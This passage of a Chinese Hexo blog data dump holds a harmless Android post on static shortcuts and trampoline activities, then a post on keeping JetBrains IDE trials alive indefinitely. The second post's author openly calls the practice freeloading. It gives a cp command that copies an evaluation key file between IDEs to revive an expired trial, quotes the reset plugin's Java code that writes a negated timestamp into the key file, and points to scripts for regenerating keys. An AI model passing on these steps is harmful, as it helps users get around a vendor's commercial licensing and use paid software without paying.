/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">shortcut</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Specify more shortcuts here. --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">shortcuts</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>后来，我在官方文档看到这么一段：</p>\n<blockquote>\n<p>静态快捷方式不能有自定义 intent 标记。 静态快捷方式的第一个 intent 始终设置有 Intent.FLAG_ACTIVITY_NEW_TASK 和 Intent.FLAG_ACTIVITY_CLEAR_TASK。这意味着，如果应用已在运行，则在静态快捷方式启动时，应用中的所有现有 Activity 都会被销毁。如果不希望出现这种行为，您可以使用 Trampoline Activity ……</p>\n</blockquote>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>这个Trampoline意思就是设置一个跳板Activity，来分发启动目标Activity，并且我们需要让这个跳板Activity和应用的其他Activity不在一个栈中，很简单，设置 <code>taskAffinity</code> 属性即可：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- AndroidManifest.xml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TrampolineActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;&quot;</span> /&gt;</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">&lt;!-- xml/shortcuts.xml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:targetPackage</span>=<span class=\"string\">&quot;com.example.myapplication&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:targetClass</span>=<span class=\"string\">&quot;com.example.myapplication.TrampolineActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>不显示设置taskAffinity，其默认值为包名，所以只要给我们的跳板Activity设置非包名的字符串就行。如此，再通过桌面长按快捷方式打开应用时，就不会销毁其他页面了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>我们都知道，从API 25开始，Android加入了类似3D Touch一样的功能，即长按桌面图标可以弹出快捷方式菜单（最多4个）。早期国产系统的桌面Launcher并没有积极适这一功能，所以各大应用也懒得做，后来才逐渐完善。目前包括微信、支付宝等都可以长按弹出快捷方式，支付宝更是支持动态配置。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/d7aa4036340c49a2a7915fda33299299.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_18,color_FFFFFF,t_70,g_se,x_16\" alt=\"image-20210927162251836\"></p>\n<p>开发文档直接看官方的就行：<a href=\"https://developer.android.com/guide/topics/ui/shortcuts?hl=zh-cn\">https://developer.android.com/guide/topics/ui/shortcuts</a> ，静态快捷方式适配很简单，加xml文件就完事，此处不赘述。</p>\n<p>但在实际体验开发过程中发现，通过快捷方式打开应用的对应页面后，其他Activity会被销毁。这并不是我们想要的效果。</p>\n<h3 id=\"简单分析\"><a href=\"#简单分析\" class=\"headerlink\" title=\"简单分析\"></a>简单分析</h3><p>这个现象很像是在启动Activity时设置了 <strong>CLEAR_TASK</strong> 的标识，导致任务栈被清空。但是，从下列的使用示例来看，静态快捷方式又无法设置Intent的flag，相关逻辑由系统SDK内部实现。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">shortcuts</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">shortcut</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutId</span>=<span class=\"string\">&quot;compose&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:enabled</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:icon</span>=<span class=\"string\">&quot;@drawable/compose_icon&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutShortLabel</span>=<span class=\"string\">&quot;@string/compose_shortcut_short_label1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutLongLabel</span>=<span class=\"string\">&quot;@string/compose_shortcut_long_label1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:shortcutDisabledMessage</span>=<span class=\"string\">&quot;@string/compose_disabled_message1&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 例1 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:targetPackage</span>=<span class=\"string\">&quot;com.example.myapplication&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:targetClass</span>=<span class=\"string\">&quot;com.example.myapplication.ComposeActivity&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 例2 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:data</span>=<span class=\"string\">&quot;xxx://xxx/xxx&quot;</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">shortcut</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Specify more shortcuts here. --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">shortcuts</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>后来，我在官方文档看到这么一段：</p>\n<blockquote>\n<p>静态快捷方式不能有自定义 intent 标记。 静态快捷方式的第一个 intent 始终设置有 Intent.FLAG_ACTIVITY_NEW_TASK 和 Intent.FLAG_ACTIVITY_CLEAR_TASK。这意味着，如果应用已在运行，则在静态快捷方式启动时，应用中的所有现有 Activity 都会被销毁。如果不希望出现这种行为，您可以使用 Trampoline Activity ……</p>\n</blockquote>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>这个Trampoline意思就是设置一个跳板Activity，来分发启动目标Activity，并且我们需要让这个跳板Activity和应用的其他Activity不在一个栈中，很简单，设置 <code>taskAffinity</code> 属性即可：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- AndroidManifest.xml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TrampolineActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;&quot;</span> /&gt;</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">&lt;!-- xml/shortcuts.xml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">intent</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:action</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:targetPackage</span>=<span class=\"string\">&quot;com.example.myapplication&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">android:targetClass</span>=<span class=\"string\">&quot;com.example.myapplication.TrampolineActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>不显示设置taskAffinity，其默认值为包名，所以只要给我们的跳板Activity设置非包名的字符串就行。如此，再通过桌面长按快捷方式打开应用时，就不会销毁其他页面了。</p>\n"},{"layout":"post","title":"IDE Eval Reset忘了重置进不去怎么办","subtitle":"偶尔探索一下，就能解决全网问题。","date":"2021-10-09T16:00:00.000Z","author":"YSY","header-img":"img/404-bg.jpg","catalog":true,"_content":"\n### 问题\n\n我相信很多白嫖怪都知道目前JB全家桶“极为先进”的使用方法——其实就是无限重置30天（[IDE Eval Reset](https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html)）。具体使用方法就不赘述了。\n\n这里会出现一个问题，尤其是针对电脑上安装了多款JB家的IDE用户来说（比如我就是，IDEA、PyCharm和CLion都在使bai用piao），如果**超过30天未打开**其中某个IDE进行试用重置，那么你就会发现打不开了，要求你补充License，而且菜单栏也没有地方让你再去打开Eval Reset插件了。怎么办！？\n\n或许你唯一能想到的办法就是完全卸载，清空一切相关配置文件和卸载残留，重新安装，重新试用。但是这样损失惨重啊，尤其是很多设置和项目又要重新导入。\n\n### 解决\n\n这个办法也是我偶然发现的，你在其他地方肯定搜不到。不过当你第一次遇到这个问题时，有个**前提：需要至少有一款IDE是可以打开使用的，也就是刚刚使用过Eval Reset并且还在30天内的。**\n\n举例，比如我现在PyCharm打不开了，但是IDEA平时经常用到，所以能打开，接下来：\n\n1、这里以macOS版本为例（其他系统也是类似的，就是路径不太一样，看后文），复制IDEA内部eval文件夹下面的key到PyCharm对应文件夹下面：\n\n```bash\n# xxx是你的用户名\ncp /Users/xxx/Library/Application\\ Support/JetBrains/IntelliJIdea2021.2/eval/idea212.evaluation.key /Users/xxx/Library/Application\\ Support/JetBrains/PyCharm2021.2/eval/PyCharm212.evaluation.key\n```\n\n![](https://imgconvert.csdnimg.cn/3ea46506bfc742e7925e8489ebefb274.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n\n注意key文件是否存在，版本一定要对应当前安装的版本，比如我这里212就是2021.2版本。复制后注意改名，比如idea212前缀要记得改成PyCharm212，如上述命令一行搞定。\n\n2、此时再重新打开PyCharm会发现奇迹般地复活了，重置时间也和IDEA的一模一样。\n\n#### 关于路径\n\n这个插件是个[开源项目](https://gitee.com/pengzhile/ide-eval-resetter)，从其脚本文件源码可看到路径配置：\n\n```java\n// Resetter.java\nprotected static File getEvalDir() {\n    String configPath = PathManager.getConfigPath();\n    return new File(configPath, \"eval\");\n}\n```\n\n上面这个PathManager实际上是 `com.intellij.openapi.application.PathManager` ，我们直接去GitHub搜IDEA的开源代码即可：[PathManager.java](https://github.com/JetBrains/intellij-community/blob/master/platform/util/src/com/intellij/openapi/application/PathManager.java)\n\n所以Windows的路径一般是：`C:\\Users\\xxx\\AppData\\Roaming\\JetBrains\\IntelliJIdea2021.2\\eval` ，Linux自行探索。\n\n### 思考\n\n从上述解决方法我们可以看出，无限重置时间之所以能生效，关键就在这些key文件。我大致了解了一下此插件源代码之后，可以得知key文件里面存储的信息：\n\n```java\n// LicenseFileRecord.java\n@Override\npublic void reset() throws Exception {\n    if (!FileUtil.delete(file)) {\n        throw new Exception(\"Remove \" + type + \" failed: \" + file.getAbsolutePath());\n    }\n    // 此处写入了当前时间戳，貌似就是这么简单\n    try (DataOutputStream dos = new DataOutputStream(new FileOutputStream(file))) {\n        dos.writeLong(~System.currentTimeMillis());\n    }\n}\n```\n\n因此，如果我们的所有key文件都超过30天过期了，就可以copy一下插件的源代码，自己去运行这些逻辑手动写入信息或生成key文件，具体操作就不赘述了。\n\n总之，此插件还是有它的局限性，大部分代码都是GUI相关的，~~如果作者可以搞一个可执行脚本就好了~~，这样可以在命令行中拯救那些过期后打不开的JB全家桶。\n\n**最新：** 后来发现呢，实际上作者有提供这样一个[临时脚本](https://gitee.com/pengzhile/ide-eval-resetter/tree/master/scripts)，可以让打不开IDE的（Evaluate for free显示不可选）重新获取权限。\n","source":"_posts/2021-10-10-IDE Eval Reset忘了重置进不去怎么办.md","raw":"---\nlayout:     post\ntitle:      IDE Eval Reset忘了重置进不去怎么办\nsubtitle:   偶尔探索一下，就能解决全网问题。\ndate:       2021-10-10\nauthor:     YSY\nheader-img: img/404-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n---\n\n### 问题\n\n我相信很多白嫖怪都知道目前JB全家桶“极为先进”的使用方法——其实就是无限重置30天（[IDE Eval Reset](https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html)）。具体使用方法就不赘述了。\n\n这里会出现一个问题，尤其是针对电脑上安装了多款JB家的IDE用户来说（比如我就是，IDEA、PyCharm和CLion都在使bai用piao），如果**超过30天未打开**其中某个IDE进行试用重置，那么你就会发现打不开了，要求你补充License，而且菜单栏也没有地方让你再去打开Eval Reset插件了。怎么办！？\n\n或许你唯一能想到的办法就是完全卸载，清空一切相关配置文件和卸载残留，重新安装，重新试用。但是这样损失惨重啊，尤其是很多设置和项目又要重新导入。\n\n### 解决\n\n这个办法也是我偶然发现的，你在其他地方肯定搜不到。不过当你第一次遇到这个问题时，有个**前提：需要至少有一款IDE是可以打开使用的，也就是刚刚使用过Eval Reset并且还在30天内的。**\n\n举例，比如我现在PyCharm打不开了，但是IDEA平时经常用到，所以能打开，接下来：\n\n1、这里以macOS版本为例（其他系统也是类似的，就是路径不太一样，看后文），复制IDEA内部eval文件夹下面的key到PyCharm对应文件夹下面：\n\n```bash\n# xxx是你的用户名\ncp /Users/xxx/Library/Application\\ Support/JetBrains/IntelliJIdea2021.2/eval/idea212.evaluation.key /Users/xxx/Library/Application\\ Support/JetBrains/PyCharm2021.2/eval/PyCharm212.evaluation.key\n```\n\n![](https://imgconvert.csdnimg.cn/3ea46506bfc742e7925e8489ebefb274.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n\n注意key文件是否存在，版本一定要对应当前安装的版本，比如我这里212就是2021.2版本。复制后注意改名，比如idea212前缀要记得改成PyCharm212，如上述命令一行搞定。\n\n2、此时再重新打开PyCharm会发现奇迹般地复活了，重置时间也和IDEA的一模一样。\n\n#### 关于路径\n\n这个插件是个[开源项目](https://gitee.com/pengzhile/ide-eval-resetter)，从其脚本文件源码可看到路径配置：\n\n```java\n// Resetter.java\nprotected static File getEvalDir() {\n    String configPath = PathManager.getConfigPath();\n    return new File(configPath, \"eval\");\n}\n```\n\n上面这个PathManager实际上是 `com.intellij.openapi.application.PathManager` ，我们直接去GitHub搜IDEA的开源代码即可：[PathManager.java](https://github.com/JetBrains/intellij-community/blob/master/platform/util/src/com/intellij/openapi/application/PathManager.java)\n\n所以Windows的路径一般是：`C:\\Users\\xxx\\AppData\\Roaming\\JetBrains\\IntelliJIdea2021.2\\eval` ，Linux自行探索。\n\n### 思考\n\n从上述解决方法我们可以看出，无限重置时间之所以能生效，关键就在这些key文件。我大致了解了一下此插件源代码之后，可以得知key文件里面存储的信息：\n\n```java\n// LicenseFileRecord.java\n@Override\npublic void reset() throws Exception {\n    if (!FileUtil.delete(file)) {\n        throw new Exception(\"Remove \" + type + \" failed: \" + file.getAbsolutePath());\n    }\n    // 此处写入了当前时间戳，貌似就是这么简单\n    try (DataOutputStream dos = new DataOutputStream(new FileOutputStream(file))) {\n        dos.writeLong(~System.currentTimeMillis());\n    }\n}\n```\n\n因此，如果我们的所有key文件都超过30天过期了，就可以copy一下插件的源代码，自己去运行这些逻辑手动写入信息或生成key文件，具体操作就不赘述了。\n\n总之，此插件还是有它的局限性，大部分代码都是GUI相关的，~~如果作者可以搞一个可执行脚本就好了~~，这样可以在命令行中拯救那些过期后打不开的JB全家桶。\n\n**最新：** 后来发现呢，实际上作者有提供这样一个[临时脚本](https://gitee.com/pengzhile/ide-eval-resetter/tree/master/scripts)，可以让打不开IDE的（Evaluate for free显示不可选）重新获取权限。\n","slug":"IDE Eval Reset忘了重置进不去怎么办","published":1,"updated":"2024-03-25T07:31:25.986Z","comments":1,"photos":[],"link":"","_id":"cluaufh1g0049the66zcnfuqp","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>我相信很多白嫖怪都知道目前JB全家桶“极为先进”的使用方法——其实就是无限重置30天（<a href=\"https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html\">IDE Eval Reset</a>）。具体使用方法就不赘述了。</p>\n<p>这里会出现一个问题，尤其是针对电脑上安装了多款JB家的IDE用户来说（比如我就是，IDEA、PyCharm和CLion都在使bai用piao），如果<strong>超过30天未打开</strong>其中某个IDE进行试用重置，那么你就会发现打不开了，要求你补充License，而且菜单栏也没有地方让你再去打开Eval Reset插件了。怎么办！？</p>\n<p>或许你唯一能想到的办法就是完全卸载，清空一切相关配置文件和卸载残留，重新安装，重新试用。但是这样损失惨重啊，尤其是很多设置和项目又要重新导入。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>这个办法也是我偶然发现的，你在其他地方肯定搜不到。不过当你第一次遇到这个问题时，有个<strong>前提：需要至少有一款IDE是可以打开使用的，也就是刚刚使用过Eval Reset并且还在30天内的。</strong></p>\n<p>举例，比如我现在PyCharm打不开了，但是IDEA平时经常用到，所以能打开，接下来：</p>\n<p>1、这里以macOS版本为例（其他系统也是类似的，就是路径不太一样，看后文），复制IDEA内部eval文件夹下面的key到PyCharm对应文件夹下面：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># xxx是你的用户名</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /Users/xxx/Library/Application\\ Support/JetBrains/IntelliJIdea2021.2/eval/idea212.evaluation.key /Users/xxx/Library/Application\\ Support/JetBrains/PyCharm2021.2/eval/PyCharm212.evaluation.key</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://imgconvert.csdnimg.cn/3ea46506bfc742e7925e8489ebefb274.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<p>注意key文件是否存在，版本一定要对应当前安装的版本，比如我这里212就是2021.2版本。复制后注意改名，比如idea212前缀要记得改成PyCharm212，如上述命令一行搞定。</p>\n<p>2、此时再重新打开PyCharm会发现奇迹般地复活了，重置时间也和IDEA的一模一样。</p>\n<h4 id=\"关于路径\"><a href=\"#关于路径\" class=\"headerlink\" title=\"关于路径\"></a>关于路径</h4><p>这个插件是个<a href=\"https://gitee.com/pengzhile/ide-eval-resetter\">开源项目</a>，从其脚本文件源码可看到路径配置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Resetter.java</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">static</span> File <span class=\"title function_\">getEvalDir</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">configPath</span> <span class=\"operator\">=</span> PathManager.getConfigPath();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(configPath, <span class=\"string\">&quot;eval&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面这个PathManager实际上是 <code>com.intellij.openapi.application.PathManager</code> ，我们直接去GitHub搜IDEA的开源代码即可：<a href=\"https://github.com/JetBrains/intellij-community/blob/master/platform/util/src/com/intellij/openapi/application/PathManager.java\">PathManager.java</a></p>\n<p>所以Windows的路径一般是：<code>C:\\Users\\xxx\\AppData\\Roaming\\JetBrains\\IntelliJIdea2021.2\\eval</code> ，Linux自行探索。</p>\n<h3 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3><p>从上述解决方法我们可以看出，无限重置时间之所以能生效，关键就在这些key文件。我大致了解了一下此插件源代码之后，可以得知key文件里面存储的信息：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// LicenseFileRecord.java</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">reset</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!FileUtil.delete(file)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exception</span>(<span class=\"string\">&quot;Remove &quot;</span> + type + <span class=\"string\">&quot; failed: &quot;</span> + file.getAbsolutePath());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 此处写入了当前时间戳，貌似就是这么简单</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> (<span class=\"type\">DataOutputStream</span> <span class=\"variable\">dos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DataOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(file))) &#123;</span><br><span class=\"line\">        dos.writeLong(~System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，如果我们的所有key文件都超过30天过期了，就可以copy一下插件的源代码，自己去运行这些逻辑手动写入信息或生成key文件，具体操作就不赘述了。</p>\n<p>总之，此插件还是有它的局限性，大部分代码都是GUI相关的，<del>如果作者可以搞一个可执行脚本就好了</del>，这样可以在命令行中拯救那些过期后打不开的JB全家桶。</p>\n<p><strong>最新：</strong> 后来发现呢，实际上作者有提供这样一个<a href=\"https://gitee.com/pengzhile/ide-eval-resetter/tree/master/scripts\">临时脚本</a>，可以让打不开IDE的（Evaluate for free显示不可选）重新获取权限。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>我相信很多白嫖怪都知道目前JB全家桶“极为先进”的使用方法——其实就是无限重置30天（<a href=\"https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html\">IDE Eval Reset</a>）。具体使用方法就不赘述了。</p>\n<p>这里会出现一个问题，尤其是针对电脑上安装了多款JB家的IDE用户来说（比如我就是，IDEA、PyCharm和CLion都在使bai用piao），如果<strong>超过30天未打开</strong>其中某个IDE进行试用重置，那么你就会发现打不开了，要求你补充License，而且菜单栏也没有地方让你再去打开Eval Reset插件了。怎么办！？</p>\n<p>或许你唯一能想到的办法就是完全卸载，清空一切相关配置文件和卸载残留，重新安装，重新试用。但是这样损失惨重啊，尤其是很多设置和项目又要重新导入。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>这个办法也是我偶然发现的，你在其他地方肯定搜不到。不过当你第一次遇到这个问题时，有个<strong>前提：需要至少有一款IDE是可以打开使用的，也就是刚刚使用过Eval Reset并且还在30天内的。</strong></p>\n<p>举例，比如我现在PyCharm打不开了，但是IDEA平时经常用到，所以能打开，接下来：</p>\n<p>1、这里以macOS版本为例（其他系统也是类似的，就是路径不太一样，看后文），复制IDEA内部eval文件夹下面的key到PyCharm对应文件夹下面：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># xxx是你的用户名</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /Users/xxx/Library/Application\\ Support/JetBrains/IntelliJIdea2021.2/eval/idea212.evaluation.key /Users/xxx/Library/Application\\ Support/JetBrains/PyCharm2021.2/eval/PyCharm212.evaluation.key</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://imgconvert.csdnimg.cn/3ea46506bfc742e7925e8489ebefb274.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<p>注意key文件是否存在，版本一定要对应当前安装的版本，比如我这里212就是2021.2版本。复制后注意改名，比如idea212前缀要记得改成PyCharm212，如上述命令一行搞定。</p>\n<p>2、此时再重新打开PyCharm会发现奇迹般地复活了，重置时间也和IDEA的一模一样。</p>\n<h4 id=\"关于路径\"><a href=\"#关于路径\" class=\"headerlink\" title=\"关于路径\"></a>关于路径</h4><p>这个插件是个<a href=\"https://gitee.com/pengzhile/ide-eval-resetter\">开源项目</a>，从其脚本文件源码可看到路径配置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Resetter.java</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">static</span> File <span class=\"title function_\">getEvalDir</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">configPath</span> <span class=\"operator\">=</span> PathManager.getConfigPath();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(configPath, <span class=\"string\">&quot;eval&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面这个PathManager实际上是 <code>com.intellij.openapi.application.PathManager</code> ，我们直接去GitHub搜IDEA的开源代码即可：<a href=\"https://github.com/JetBrains/intellij-community/blob/master/platform/util/src/com/intellij/openapi/application/PathManager.java\">PathManager.java</a></p>\n<p>所以Windows的路径一般是：<code>C:\\Users\\xxx\\AppData\\Roaming\\JetBrains\\IntelliJIdea2021.2\\eval</code> ，Linux自行探索。</p>\n<h3 id=\"思考\"><a 